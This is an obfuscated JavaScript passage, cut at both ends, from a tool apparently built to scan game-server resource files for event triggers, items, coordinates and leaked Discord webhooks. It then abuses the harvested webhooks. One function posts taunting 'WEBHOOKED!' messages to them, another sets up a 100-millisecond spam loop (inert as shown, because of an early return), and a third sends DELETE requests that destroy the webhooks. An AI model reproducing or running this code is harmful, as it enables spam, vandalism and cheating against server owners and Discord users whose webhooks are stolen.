      _0x53331c.innerHTML = "\n                <div class=\"file-viewer-header\">\n                    <div class=\"file-viewer-title\">\n                        <i class=\"fas fa-link\"></i>\n                        Webhook Preview: " + _0x5f51b7.substring(0x0, 0x32) + "...\n                    </div>\n                    <button class=\"file-viewer-close\" id=\"close-preview\">\n                        <i class=\"fas fa-times\"></i>\n                    </button>\n                </div>\n                <div class=\"file-viewer-content\">\n                    <pre><code>Webhook URL: " + _0x5f51b7 + "\nResource: " + (_0x212753 || "unknown") + "\nFile: " + (_0x4d7962?.['file'] || _0x399985 || "unknown") + "\nLine: " + (_0x4d7962?.["line"] || _0x3b10f8 || "unknown") + "\n\nWebhook Information:\n- URL: " + _0x5f51b7 + "\n- Resource: " + (_0x212753 || "unknown") + "\n- Status: " + (_0x4d7962?.['status'] || "Active") + "\n- Type: Discord Webhook\n- File: " + (_0x4d7962?.['file'] || _0x399985 || "unknown") + "\n- Line: " + (_0x4d7962?.["line"] || _0x3b10f8 || "unknown") + "\n\nThis webhook was discovered during the file scan process.</code></pre>\n                </div>\n            ";
      _0x3e4464.appendChild(_0x42f1ea);
      _0x3e4464.appendChild(_0x53331c);
      document.body.appendChild(_0x3e4464);
      const _0x96be31 = _0x53331c.querySelector("#close-preview");
      const _0x880dee = () => {
        document.body.removeChild(_0x3e4464);
      };
      _0x96be31.addEventListener('click', _0x880dee);
      _0x42f1ea.addEventListener('click', _0x880dee);
      const _0x460898 = _0x4e790f => {
        if (_0x4e790f.key === "Escape") {
          _0x880dee();
          document.removeEventListener("keydown", _0x460898);
        }
      };
      document.addEventListener("keydown", _0x460898);
      showNotification("Opening webhook preview: " + _0x5f51b7.substring(0x0, 0x1e) + "...", 'info');
    }
  } catch (_0x3d490d) {
    console.error("Error opening webhook preview:", _0x3d490d);
    showNotification("Error opening webhook preview", 'error');
  }
}
function copyItemName(_0x18fc08) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(_0x18fc08);
      showNotification("Item name copied to clipboard", "success");
    } else {
      const _0xc9d7c1 = document.createElement("textarea");
      _0xc9d7c1.value = _0x18fc08;
      _0xc9d7c1.style.position = "fixed";
      _0xc9d7c1.style.left = "-999999px";
      _0xc9d7c1.style.top = "-999999px";
      document.body.appendChild(_0xc9d7c1);
      _0xc9d7c1.focus();
      _0xc9d7c1.select();
      try {
        document.execCommand("copy");
        showNotification("Item name copied to clipboard", 'success');
      } catch (_0x3e99e2) {
        showNotification("Please copy manually: " + _0x18fc08, "warning");
      }
      document.body.removeChild(_0xc9d7c1);
    }
  } catch (_0x20578a) {
    console.error("Error copying item name:", _0x20578a);
    showNotification("Error copying item name", 'error');
  }
}
function viewItem(_0x20ef5e) {
  showNotification("Viewing item: " + _0x20ef5e, 'info');
}
function transferItemToEditor(_0x3fdd3a, _0x30d484) {
  try {
    switchTab("editor");
    const _0x42e1a8 = document.getElementById("resource-name");
    if (_0x42e1a8) {
      _0x42e1a8.value = _0x30d484 || "unknown";
    }
    const _0x209a86 = document.getElementById("editor-textarea");
    if (_0x209a86) {
      _0x209a86.value = "-- Item: " + _0x3fdd3a + "\n-- Resource: " + (_0x30d484 || 'unknown') + "\n-- Generated by Finder\n\n-- Add your item-related code here";
    }
    showNotification("Transferred item " + _0x3fdd3a + " to editor", "success");
  } catch (_0x455349) {
    console.error("Error transferring item to editor:", _0x455349);
    showNotification("Error transferring item to editor", "error");
  }
}
function openItemPreview(_0x27ea58, _0x39b0d6) {
  try {
    const _0x1d78ad = appState.scanResults.items.find(_0x4318c1 => _0x4318c1.name === _0x27ea58);
    if (_0x1d78ad && _0x1d78ad.file) {
      openTriggerPreview(_0x39b0d6 || "unknown", _0x1d78ad.file, _0x1d78ad.line || 0x1);
    } else {
      const _0x475337 = document.createElement('div');
      _0x475337.className = "file-viewer-modal";
      _0x475337.style.zIndex = "10000";
      const _0x265995 = document.createElement("div");
      _0x265995.className = "file-viewer-overlay";
      const _0x3301cb = document.createElement("div");
      _0x3301cb.className = "file-viewer-window";
      _0x3301cb.innerHTML = "\n                <div class=\"file-viewer-header\">\n                    <div class=\"file-viewer-title\">\n                        <i class=\"fas fa-cube\"></i>\n                        Item Preview: " + _0x27ea58 + "\n                    </div>\n                    <button class=\"file-viewer-close\" id=\"close-preview\">\n                        <i class=\"fas fa-times\"></i>\n                    </button>\n                </div>\n                <div class=\"file-viewer-content\">\n                    <pre><code>Item Name: " + _0x27ea58 + "\nResource: " + (_0x39b0d6 || "unknown") + "\nFile: " + (_0x1d78ad?.['file'] || "unknown") + "\nLine: " + (_0x1d78ad?.["line"] || 'unknown') + "\n\nItem Information:\n- Name: " + _0x27ea58 + "\n- Label: " + (_0x1d78ad?.["label"] || "No label") + "\n- Type: Item\n- Status: Found in scan\n\nThis item was discovered during the file scan process.</code></pre>\n                </div>\n            ";
      _0x475337.appendChild(_0x265995);
      _0x475337.appendChild(_0x3301cb);
      document.body.appendChild(_0x475337);
      const _0x264a61 = _0x3301cb.querySelector("#close-preview");
      const _0x1b61e1 = () => {
        document.body.removeChild(_0x475337);
      };
      _0x264a61.addEventListener('click', _0x1b61e1);
      _0x265995.addEventListener("click", _0x1b61e1);
      const _0x5a1ca1 = _0x1e8946 => {
        if (_0x1e8946.key === 'Escape') {
          _0x1b61e1();
          document.removeEventListener("keydown", _0x5a1ca1);
        }
      };
      document.addEventListener("keydown", _0x5a1ca1);
      showNotification("Opening item preview: " + _0x27ea58, "info");
    }
  } catch (_0x3893c1) {
    console.error("Error opening item preview:", _0x3893c1);
    showNotification("Error opening item preview", "error");
  }
}
function saveItem(_0x41688d, _0x4a7007) {
  try {
    const _0x37bc7e = "item_" + Date.now() + '_' + Math.random().toString(0x24).substr(0x2, 0x9);
    const _0x197a42 = {
      'id': _0x37bc7e,
      'name': _0x41688d,
      'resource': _0x4a7007 || "unknown",
      'type': 'item',
      'savedAt': new Date().toISOString(),
      'originalData': {
        'name': _0x41688d,
        'resource': _0x4a7007 || "unknown"
      }
    };
    appState.savedTriggers.push(_0x197a42);
    saveTriggersToLocalStorage();
    updateSavedTriggersList();
    updateStats();
    showNotification("Saved item: " + _0x41688d, "success");
  } catch (_0x590481) {
    console.error("Error saving item:", _0x590481);
    showNotification("Error saving item", 'error');
  }
}
function copyCoordinates(_0x34dbb5) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(_0x34dbb5);
      showNotification("Coordinates copied to clipboard", "success");
    } else {
      const _0x251cbb = document.createElement("textarea");
      _0x251cbb.value = _0x34dbb5;
      _0x251cbb.style.position = "fixed";
      _0x251cbb.style.left = "-999999px";
      _0x251cbb.style.top = "-999999px";
      document.body.appendChild(_0x251cbb);
      _0x251cbb.focus();
      _0x251cbb.select();
      try {
        document.execCommand('copy');
        showNotification("Coordinates copied to clipboard", 'success');
      } catch (_0x7cfbe4) {
        showNotification("Please copy manually: " + _0x34dbb5, "warning");
      }
      document.body.removeChild(_0x251cbb);
    }
  } catch (_0x345301) {
    console.error("Error copying coordinates:", _0x345301);
    showNotification("Error copying coordinates", "error");
  }
}
function copyCoordinatesValues(_0x1e220a, _0x3c9a7d, _0x3364cc, _0x318988 = null) {
  try {
    const _0x2a4ed8 = _0x318988 !== null ? _0x1e220a + ", " + _0x3c9a7d + ", " + _0x3364cc + ", " + _0x318988 : _0x1e220a + ", " + _0x3c9a7d + ", " + _0x3364cc;
    navigator.clipboard.writeText(_0x2a4ed8);
    showNotification("Coordinate values copied to clipboard", "success");
  } catch (_0x473dd1) {
    console.error("Error copying coordinate values:", _0x473dd1);
    showNotification("Error copying coordinate values", "error");
  }
}
function viewCoordinates(_0x442cc3, _0x5972c3, _0xe3a7c4) {
  try {
    const _0x2804ba = document.querySelector(".resource-explorer");
    if (_0x2804ba) {
      _0x2804ba.scrollIntoView({
        'behavior': 'smooth'
      });
      navigateToFileInExplorer(_0x5972c3, _0x442cc3);
      showNotification("Navigating to " + _0x5972c3 + " in resource explorer", "success");
    } else {
      showNotification("Viewing coordinates: " + _0x442cc3 + " in " + _0x5972c3 + ':' + _0xe3a7c4, 'info');
    }
  } catch (_0x4f4079) {
    console.error("Error navigating to coordinates file:", _0x4f4079);
    showNotification("Viewing coordinates: " + _0x442cc3 + " in " + _0x5972c3 + ':' + _0xe3a7c4, "info");
  }
}
function handleCoordinateSearch(_0x51291b) {
  const _0xdb3a8b = _0x51291b.target.value.toLowerCase();
  const _0x134693 = document.getElementById("coordinate-type-filter")?.["value"] || "all";
  let _0x577900 = appState.scanResults.coordinates.filter(_0x241ccd => {
    const _0x442173 = _0x241ccd.resource.toLowerCase().includes(_0xdb3a8b) || _0x241ccd.coordinates.toLowerCase().includes(_0xdb3a8b) || _0x241ccd.type.toLowerCase().includes(_0xdb3a8b) || _0x241ccd.nearItem && _0x241ccd.nearItem.toLowerCase().includes(_0xdb3a8b);
    const _0x9d19ac = _0x134693 === 'all' || _0x241ccd.type === _0x134693;
    return _0x442173 && _0x9d19ac;
  });
  updateCoordinatesTable(_0x577900);
}
function handleCoordinateTypeFilter(_0x5b1cd7) {
  const _0x2417f2 = _0x5b1cd7.target.value;
  const _0x482a7f = document.getElementById("coordinate-search")?.["value"]["toLowerCase"]() || '';
  let _0x3b5759 = appState.scanResults.coordinates.filter(_0x1a69ae => {
    const _0x2d868a = _0x1a69ae.resource.toLowerCase().includes(_0x482a7f) || _0x1a69ae.coordinates.toLowerCase().includes(_0x482a7f) || _0x1a69ae.type.toLowerCase().includes(_0x482a7f) || _0x1a69ae.nearItem && _0x1a69ae.nearItem.toLowerCase().includes(_0x482a7f);
    const _0x106656 = _0x2417f2 === "all" || _0x1a69ae.type === _0x2417f2;
    return _0x2d868a && _0x106656;
  });
  updateCoordinatesTable(_0x3b5759);
}
function updateSavedTriggersList() {
  try {
    const _0xb07246 = document.getElementById("saved-triggers-list");
    if (!_0xb07246) {
      return;
    }
    _0xb07246.innerHTML = '';
    if (appState.savedTriggers.length === 0x0) {
      _0xb07246.innerHTML = "<p style=\"color: #8b9dc3; text-align: center;\">No saved triggers yet</p>";
      return;
    }
    appState.savedTriggers.forEach(_0x383a3d => {
      const _0x33ca50 = document.createElement("div");
      _0x33ca50.className = "saved-trigger-item";
      _0x33ca50.style.cssText = "\n                background: rgba(255, 255, 255, 0.05);\n                padding: 15px;\n                margin-bottom: 10px;\n                border-radius: 6px;\n                border: 1px solid rgba(255, 255, 255, 0.1);\n            ";
      _0x33ca50.innerHTML = "\n                <div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;\">\n                    <h4 style=\"color: #ffffff; margin: 0; cursor: pointer;\" onclick=\"editTriggerName(" + _0x383a3d.id + ", '" + _0x383a3d.resource.replace(/'/g, "\\'") + "')\" title=\"Click to edit name\">\n                        <i class=\"fas fa-edit\" style=\"margin-right: 5px; font-size: 10px; opacity: 0.7;\"></i>" + _0x383a3d.resource + "\n                    </h4>\n                    <span style=\"padding: 4px 8px; border-radius: 4px; font-size: 12px; background: #667eea; color: white;\">" + _0x383a3d.risk.toUpperCase() + "</span>\n                </div>\n                <p style=\"color: #8b9dc3; margin: 0; font-size: 14px; font-family: 'Courier New', monospace; word-wrap: break-word;\">Usage: " + _0x383a3d.usage + "</p>\n                <div style=\"margin-top: 10px; display: flex; gap: 10px;\">\n                    <button onclick=\"copyTrigger('" + _0x383a3d.usage.replace(/'/g, "\\'") + "')\" style=\"padding: 4px 8px; background: #f39c12; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;\">\n                        <i class=\"fas fa-copy\"></i> Copy\n                    </button>\n                    <button onclick=\"deleteSavedTrigger(" + _0x383a3d.id + ")\" style=\"padding: 4px 8px; background: #e74c3c; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;\">\n                        <i class=\"fas fa-trash\"></i> Delete\n                    </button>\n                </div>\n            ";
      _0xb07246.appendChild(_0x33ca50);
    });
  } catch (_0x3e332a) {
    console.error("Error updating saved triggers list:", _0x3e332a);
  }
}
function deleteSavedTrigger(_0x108b00) {
  try {
    appState.savedTriggers = appState.savedTriggers.filter(_0x48bdb7 => _0x48bdb7.id !== _0x108b00);
    saveTriggersToLocalStorage();
    updateSavedTriggersList();
    updateStats();
    showNotification("Saved trigger deleted", "success");
  } catch (_0xdfa6fa) {
    console.error("Error deleting saved trigger:", _0xdfa6fa);
    showNotification("Error deleting saved trigger", "error");
  }
}
function clearResults() {
  try {
    const _0x26d5d8 = document.getElementById('triggers-tbody');
    if (_0x26d5d8) {
      _0x26d5d8.innerHTML = '';
    }
    const _0x5904d7 = document.getElementById("webhooks-tbody");
    if (_0x5904d7) {
      _0x5904d7.innerHTML = '';
    }
    const _0x116c15 = document.getElementById('items-tbody');
    if (_0x116c15) {
      _0x116c15.innerHTML = '';
    }
    const _0x460dd6 = document.getElementById("coordinates-tbody");
    if (_0x460dd6) {
      _0x460dd6.innerHTML = '';
    }
    const _0x39f198 = document.getElementById("resource-tree");
    if (_0x39f198) {
      _0x39f198.innerHTML = "\n                <div class=\"resource-item\" style=\"text-align: center; color: #8b9dc3; font-style: italic; padding: 20px;\">\n                    <i class=\"fas fa-folder\" style=\"margin-right: 8px;\"></i>\n                    Select a server directory to explore\n                </div>\n            ";
    }
    appState.scanResults = {
      'triggers': [],
      'webhooks': [],
      'items': [],
      'coordinates': [],
      'anticheats': [],
      'files': 0x0
    };
    appState.selectedFiles = [];
    appState.serverDirectory = '';
    const _0xf4a71e = document.getElementById("server-directory-input");
    if (_0xf4a71e) {
      _0xf4a71e.value = '';
    }
    const _0x34752e = document.getElementById("search-input");
    if (_0x34752e) {
      _0x34752e.value = '';
    }
    const _0x2d1c80 = document.getElementById('resource-search-input');
    if (_0x2d1c80) {
      _0x2d1c80.value = '';
    }
    const _0x4b6e18 = document.getElementById('coordinate-search');
    if (_0x4b6e18) {
      _0x4b6e18.value = '';
    }
    const _0x3ac875 = document.getElementById("coordinate-type-filter");
    if (_0x3ac875) {
      _0x3ac875.value = "all";
    }
    updateTriggersTable([]);
    updateWebhooksTable([]);
    updateItemsTable([]);
    updateCoordinatesTable([]);
    updateStats();
    showNotification("All results cleared", "success");
  } catch (_0xd9e57) {
    console.error("Error clearing results:", _0xd9e57);
    showNotification("Error clearing results", "error");
  }
}
function handleSearch(_0x156f36) {
  const _0x4faaca = _0x156f36.target.value.toLowerCase();
  const _0x884667 = appState.scanResults.triggers.filter(_0x3db849 => _0x3db849.resource.toLowerCase().includes(_0x4faaca) || _0x3db849.usage.toLowerCase().includes(_0x4faaca));
  updateTriggersTable(_0x884667);
}
function updateStats() {
  try {
    const _0x370e69 = appState.knownTriggers.length;
    const _0x42054e = appState.scanResults.items.length;
    const _0x4799d9 = appState.scanResults.webhooks.length + appState.manualWebhooks.length;
    const _0x3e48da = appState.scanResults.triggers.length;
    const _0x38c1d2 = appState.scanResults.files || 0x0;
    const _0x26bdd9 = document.getElementById("known-count");
    const _0x3f3c35 = document.getElementById("triggers-count");
    const _0x10ed06 = document.getElementById('items-count');
    const _0x4eaad4 = document.getElementById("webhooks-count");
    const _0xdfb97a = document.getElementById("files-count");
    if (_0x26bdd9) {
      _0x26bdd9.textContent = _0x370e69 + " Known";
    }
    if (_0x3f3c35) {
      _0x3f3c35.textContent = _0x3e48da + " Triggers";
    }
    if (_0x10ed06) {
      _0x10ed06.textContent = _0x42054e + " Items";
    }
    if (_0x4eaad4) {
      _0x4eaad4.textContent = _0x4799d9 + " Webhooks";
    }
    if (_0xdfb97a) {
      _0xdfb97a.textContent = _0x38c1d2 + " Files";
    }
  } catch (_0x50e383) {
    console.error("Error updating stats:", _0x50e383);
  }
}
function handleActionButton(_0x17451b) {
  try {
    switch (_0x17451b) {
      case 'Browse':
        browseServerDirectory();
        break;
      case "Deep Scan":
        performDeepScan();
        break;
      case "Clear Results":
        clearResults();
        break;
    }
  } catch (_0xecae9) {
    console.error("Error handling action button:", _0xecae9);
  }
}
async function sendWebhookOnce() {
  try {
    if (appState.selectedWebhooks.length === 0x0) {
      showNotification("Please select at least one webhook in the Webhooks tab or add manual webhooks", "error");
      return;
    }
    const _0x38bc89 = document.getElementById("override-username")?.["value"] || '';
    const _0x56272c = document.getElementById("message-content")?.["value"] || '';
    const _0x58c14a = document.getElementById("avatar-url")?.["value"] || '';
    const _0x26e930 = document.getElementById("tts-checkbox")?.["checked"] || false;
    const _0x2b811e = document.getElementById("embed-checkbox")?.["checked"] || false;
    if (!_0x56272c.trim()) {
      showNotification("Please enter a message", "error");
      return;
    }
    showNotification("Sending webhook to " + appState.selectedWebhooks.length + " webhook(s)...", "info");
    const _0x1337b3 = {
      'username': _0x38bc89 || 'legre.dev',
      'content': _0x56272c,
      'tts': _0x26e930
    };
    if (_0x58c14a) {
      _0x1337b3.avatar_url = _0x58c14a;
    }
    if (_0x2b811e) {
      _0x1337b3.embeds = [{
        'title': 'WEBHOOKED!',
        'description': "discord.gg/webhooked fuck codeplug",
        'color': 0x667eea,
        'timestamp': new Date().toISOString()
      }];
    }
    let _0x2a893a = 0x0;
    let _0x282f81 = 0x0;
    for (const _0xa849e9 of appState.selectedWebhooks) {
      try {
        const _0x565b0f = await fetch(_0xa849e9, {
          'method': 'POST',
          'headers': {
            'Content-Type': "application/json"
          },
          'body': JSON.stringify(_0x1337b3)
        });
        if (_0x565b0f.ok) {
          _0x2a893a++;
        } else {
          _0x282f81++;
          console.error("Failed to send webhook to " + _0xa849e9 + ": " + _0x565b0f.status);
        }
      } catch (_0x396953) {
        _0x282f81++;
        console.error("Error sending webhook to " + _0xa849e9 + ':', _0x396953);
      }
    }
    if (_0x2a893a > 0x0) {
      showNotification("Successfully sent to " + _0x2a893a + " webhook(s)" + (_0x282f81 > 0x0 ? ", " + _0x282f81 + " failed" : ''), 'success');
    } else {
      showNotification("Failed to send to any webhooks (" + _0x282f81 + " errors)", "error");
    }
  } catch (_0x512f67) {
    console.error("Error sending webhook:", _0x512f67);
    showNotification("Error sending webhook", "error");
  }
}
function clearWebhookForm() {
  try {
    document.getElementById("override-username").value = '';
    document.getElementById('avatar-url').value = '';
    document.getElementById("message-content").value = '';
    document.getElementById("tts-checkbox").checked = false;
    document.getElementById("embed-checkbox").checked = false;
    updatePreview();
    showNotification("Form cleared", 'success');
  } catch (_0x2489d5) {
    console.error("Error clearing form:", _0x2489d5);
  }
}
async function startWebhookSpam() {
  try {
    if (appState.selectedWebhooks.length === 0x0) {
      showNotification("Please select at least one webhook in the Webhooks tab or add manual webhooks", 'error');
      return;
    }
    const _0xafbe97 = document.getElementById('message-content')?.["value"] || '';
    const _0x3d19ea = document.getElementById('override-username')?.["value"] || '';
    const _0xcf1442 = document.getElementById("avatar-url")?.["value"] || '';
    const _0x2c373c = document.getElementById('tts-checkbox')?.["checked"] || false;
    const _0x10040d = document.getElementById("embed-checkbox")?.["checked"] || false;
    if (!_0xafbe97.trim()) {
      showNotification("Please enter a message", 'error');
      return;
    }
    appState.isSpamming = true;
    const _0x127ec4 = document.querySelector(".start-spam-btn");
    const _0x2c2eb1 = document.querySelector('.stop-spam-btn');
    _0x127ec4.disabled = true;
    _0x2c2eb1.disabled = false;
    let _0x11c8fe = 0x0;
    const _0x139dda = {
      'username': _0x3d19ea || "CodeFinder",
      'content': _0xafbe97,
      'tts': _0x2c373c
    };
    if (_0xcf1442) {
      _0x139dda.avatar_url = _0xcf1442;
    }
    if (_0x10040d) {
      _0x139dda.embeds = [{
        'title': "WEBHOOKED!",
        'description': "discord.gg/webhooked fuck codeplug",
        'color': 0x667eea,
        'timestamp': new Date().toISOString()
      }];
    }
    appState.spamInterval = setInterval(async () => {
      return;
      _0x11c8fe++;
      let _0x2c4b1e = 0x0;
      let _0x26802f = 0x0;
      for (const _0x5f06d4 of appState.selectedWebhooks) {
        try {
          const _0x2c8154 = await fetch(_0x5f06d4, {
            'method': "POST",
            'headers': {
              'Content-Type': "application/json"
            },
            'body': JSON.stringify(_0x139dda)
          });
          if (_0x2c8154.ok) {
            _0x2c4b1e++;
          } else {
            _0x26802f++;
          }
        } catch (_0xf341fc) {
          _0x26802f++;
        }
      }
      showNotification("Spam " + _0x11c8fe + ": Sent to " + _0x2c4b1e + " webhook(s)" + (_0x26802f > 0x0 ? ", " + _0x26802f + " failed" : ''), 'info');
    }, 0x64);
    showNotification("Started webhook spam to " + appState.selectedWebhooks.length + " webhook(s)", 'success');
  } catch (_0x2a471c) {
    console.error("Error starting webhook spam:", _0x2a471c);
    showNotification("Error starting webhook spam", "error");
  }
}
function stopWebhookSpam() {
  try {
    clearInterval(null);
    appState.spamInterval = null;
    appState.isSpamming = false;
    const _0x57b8cf = document.querySelector(".start-spam-btn");
    const _0x3aaf23 = document.querySelector(".stop-spam-btn");
    _0x57b8cf.disabled = false;
    _0x3aaf23.disabled = true;
    showNotification("Stopped webhook spam", 'success');
  } catch (_0x28958b) {
    console.error("Error stopping webhook spam:", _0x28958b);
  }
}
function updatePreview() {
  try {
    const _0x437a5d = document.getElementById("message-content").value || "Your message here...";
    const _0x4797aa = document.getElementById("override-username").value || "WEBHOOKED";
    const _0x4c71c6 = document.getElementById('embed-checkbox');
    const _0x576aae = document.querySelector(".message-text");
    const _0x551b03 = document.querySelector('.message-username');
    const _0x538f58 = document.querySelector(".message-embed");
    if (_0x576aae) {
      _0x576aae.textContent = _0x437a5d;
    }
    if (_0x551b03) {
      _0x551b03.textContent = _0x4797aa;
    }
    if (_0x538f58 && _0x4c71c6) {
      _0x538f58.style.display = _0x4c71c6.checked ? "block" : 'none';
    }
  } catch (_0x3241fc) {
    console.error("Error updating preview:", _0x3241fc);
  }
}
function loadSampleData() {
  updateSavedTriggersList();
  updateStats();
}
function showNotification(_0x5ce28d, _0x483130 = "info") {
  try {
    const _0x564b2a = document.createElement("div");
    _0x564b2a.style.cssText = "\n            position: fixed;\n            top: 20px;\n            right: 20px;\n            padding: 15px 20px;\n            border-radius: 6px;\n            color: white;\n            font-size: 14px;\n            z-index: 1000;\n            max-width: 300px;\n            word-wrap: break-word;\n            animation: slideIn 0.3s ease;\n        ";
    switch (_0x483130) {
      case "success":
        _0x564b2a.style.background = "#27ae60";
        break;
      case "error":
        _0x564b2a.style.background = '#e74c3c';
        break;
      case "warning":
        _0x564b2a.style.background = "#f39c12";
        break;
      default:
        _0x564b2a.style.background = "#667eea";
    }
    _0x564b2a.textContent = _0x5ce28d;
    document.body.appendChild(_0x564b2a);
    setTimeout(() => {
      _0x564b2a.style.animation = "slideOut 0.3s ease";
      setTimeout(() => {
        if (_0x564b2a.parentNode) {
          _0x564b2a.parentNode.removeChild(_0x564b2a);
        }
      }, 0x12c);
    }, 0xbb8);
  } catch (_0x577bf0) {
    console.error("Error showing notification:", _0x577bf0);
  }
}
function debounce(_0x5649b7, _0x332527) {
  let _0xa7a889;
  return function _0x1eec34(..._0x26041f) {
    const _0xb94bad = () => {
      clearTimeout(_0xa7a889);
      _0x5649b7(..._0x26041f);
    };
    clearTimeout(_0xa7a889);
    _0xa7a889 = setTimeout(_0xb94bad, _0x332527);
  };
}
const style = document.createElement("style");
style.textContent = "\n    @keyframes slideIn {\n        from {\n            transform: translateX(100%);\n            opacity: 0;\n        }\n        to {\n            transform: translateX(0);\n            opacity: 1;\n        }\n    }\n    \n    @keyframes slideOut {\n        from {\n            transform: translateX(0);\n            opacity: 1;\n        }\n        to {\n            transform: translateX(100%);\n            opacity: 0;\n        }\n    }\n";
document.head.appendChild(style);
function addManualWebhook() {
  try {
    const _0x1d7afe = document.getElementById("manual-webhook-url");
    const _0x50838b = _0x1d7afe.value.trim();
    if (!_0x50838b) {
      showNotification("Please enter a webhook URL", "error");
      return;
    }
    if (!_0x50838b.includes("discord.com/api/webhooks/") && !_0x50838b.includes("discordapp.com/api/webhooks/")) {
      showNotification("Please enter a valid Discord webhook URL", "error");
      return;
    }
    if (appState.manualWebhooks.includes(_0x50838b) || appState.selectedWebhooks.includes(_0x50838b)) {
      showNotification("This webhook is already added", "warning");
      return;
    }
    appState.manualWebhooks.push(_0x50838b);
    updateSpammerSelectedWebhooks();
    _0x1d7afe.value = '';
    showNotification("Webhook added successfully", "success");
  } catch (_0x17bb5c) {
    console.error("Error adding manual webhook:", _0x17bb5c);
    showNotification("Error adding webhook", "error");
  }
}
function updateManualWebhooksList() {
  try {
    const _0x438748 = document.getElementById("manual-webhooks-list");
    if (!_0x438748) {
      return;
    }
    _0x438748.innerHTML = '';
    const _0x27fe5e = appState.selectedWebhooks.filter(_0x25abfa => !appState.scanResults.webhooks.some(_0x3481d7 => _0x3481d7.url === _0x25abfa));
    if (_0x27fe5e.length === 0x0) {
      _0x438748.innerHTML = "<p style=\"color: #8b9dc3; text-align: center; font-size: 12px;\">No manual webhooks added</p>";
      return;
    }
    _0x27fe5e.forEach(_0x5bad9b => {
      const _0x3ae126 = document.createElement("div");
      _0x3ae126.className = "manual-webhook-item";
      _0x3ae126.innerHTML = "\n                <span class=\"webhook-url\">" + _0x5bad9b + "</span>\n                <button class=\"remove-btn\" onclick=\"removeSelectedWebhook('" + _0x5bad9b + "')\">\n                    <i class=\"fas fa-times\"></i>\n                </button>\n            ";
      _0x438748.appendChild(_0x3ae126);
    });
  } catch (_0xa04ab8) {
    console.error("Error updating manual webhooks list:", _0xa04ab8);
  }
}
function updateSelectedWebhooksList() {
  try {
    const _0x56c9a3 = document.getElementById("selected-webhooks-list");
    if (!_0x56c9a3) {
      return;
    }
    _0x56c9a3.innerHTML = '';
    if (appState.selectedWebhooks.length === 0x0) {
      _0x56c9a3.innerHTML = "<p style=\"color: #8b9dc3; text-align: center; font-size: 12px;\">No webhooks selected</p>";
      return;
    }
    appState.selectedWebhooks.forEach((_0x501977, _0x345b8b) => {
      const _0x3a12fe = document.createElement("div");
      _0x3a12fe.className = "selected-webhook-item";
      const _0x518997 = appState.manualWebhooks.includes(_0x501977);
      const _0x38132d = _0x518997 ? " (Manual)" : " (Scanned)";
      _0x3a12fe.innerHTML = "\n                <span class=\"webhook-url\">" + _0x501977 + _0x38132d + "</span>\n                <div class=\"webhook-actions\">\n                    <button class=\"delete-webhook-btn\" onclick=\"deleteWebhook('" + _0x501977 + "')\" title=\"Delete Webhook\">\n                        <i class=\"fas fa-trash\"></i>\n                    </button>\n                    <button class=\"remove-btn\" onclick=\"removeSelectedWebhook('" + _0x501977 + "')\" title=\"Remove from Selection\">\n                        <i class=\"fas fa-times\"></i>\n                    </button>\n                </div>\n            ";
      _0x56c9a3.appendChild(_0x3a12fe);
    });
  } catch (_0x60c3e8) {
    console.error("Error updating selected webhooks list:", _0x60c3e8);
  }
}
async function deleteWebhook(_0x16a381) {
  try {
    if (!confirm("Are you sure you want to DELETE this webhook? This action cannot be undone!")) {
      return;
    }
    showNotification("Deleting webhook...", "info");
    const _0x36e0cf = await fetch(_0x16a381, {
      'method': "DELETE",
      'headers': {
        'Content-Type': "application/json"
      }
    });
    if (_0x36e0cf.ok) {
      showNotification("Webhook DELETED successfully!", 'success');
      appState.selectedWebhooks = appState.selectedWebhooks.filter(_0x248357 => _0x248357 !== _0x16a381);
      updateSelectedWebhooksList();
      updateManualWebhooksList();
      updateSpammerSelectedWebhooks();
    } else {
      const _0x100113 = await _0x36e0cf.text();
      showNotification("Failed to delete webhook: " + _0x36e0cf.status + " - " + _0x100113, "error");
    }
  } catch (_0x1c3d56) {
    console.error("Error deleting webhook:", _0x1c3d56);
    showNotification("Error deleting webhook: " + _0x1c3d56.message, 'error');
  }
}
function removeDuplicateTriggers(_0x1a2efe) {
  try {
    const _0x4fe529 = new Set();
    return _0x1a2efe.filter(_0x28c189 => {
      const _0x402e7d = _0x28c189.resource + '-' + _0x28c189.usage + '-' + _0x28c189.file + '-' + _0x28c189.line;
      if (_0x4fe529.has(_0x402e7d)) {
        return false;
      }
      _0x4fe529.add(_0x402e7d);
      return true;
    });
  } catch (_0x2e58ed) {
    console.error("Error removing duplicate triggers:", _0x2e58ed);
    return _0x1a2efe;
  }
}
function removeDuplicateWebhooks(_0x440174) {
  try {
    const _0x2da280 = new Set();
    return _0x440174.filter(_0x477141 => {
      const _0xe565a3 = _0x477141.resource + '-' + _0x477141.url + '-' + _0x477141.file + '-' + _0x477141.line;
      if (_0x2da280.has(_0xe565a3)) {
        return false;
      }
      _0x2da280.add(_0xe565a3);
      return true;
    });
  } catch (_0x55097d) {
    console.error("Error removing duplicate webhooks:", _0x55097d);
    return _0x440174;
  }
}
function removeDuplicateItems(_0x58689c) {
  try {
    const _0x3bada9 = new Set();
    return _0x58689c.filter(_0x35e0a5 => {
      const _0x139596 = _0x35e0a5.resource + '-' + _0x35e0a5.name + '-' + _0x35e0a5.file + '-' + _0x35e0a5.line;
      if (_0x3bada9.has(_0x139596)) {
        return false;
      }
      _0x3bada9.add(_0x139596);
      return true;
    });
  } catch (_0x1b04c0) {
    console.error("Error removing duplicate items:", _0x1b04c0);
    return _0x58689c;
  }
}
function removeDuplicateCoordinates(_0x19e48a) {
  try {
    const _0x1d6ef6 = new Set();
    return _0x19e48a.filter(_0x133317 => {
      const _0x5cc067 = _0x133317.resource + '-' + _0x133317.x + '-' + _0x133317.y + '-' + _0x133317.z + '-' + _0x133317.file + '-' + _0x133317.line;
      if (_0x1d6ef6.has(_0x5cc067)) {
        return false;
      }
      _0x1d6ef6.add(_0x5cc067);
      return true;
    });
  } catch (_0x316d9b) {
    console.error("Error removing duplicate coordinates:", _0x316d9b);
    return _0x19e48a;
  }
}
function attachImagesToItems(_0x330b08, _0x4b4da4) {
  try {
    return _0x330b08.map(_0x2474cd => {
      const _0x203582 = _0x4b4da4.get(_0x2474cd.name.toLowerCase());
      if (_0x203582) {
        _0x2474cd.imageUrl = _0x203582;
      }
      return _0x2474cd;
    });
  } catch (_0x5ed840) {
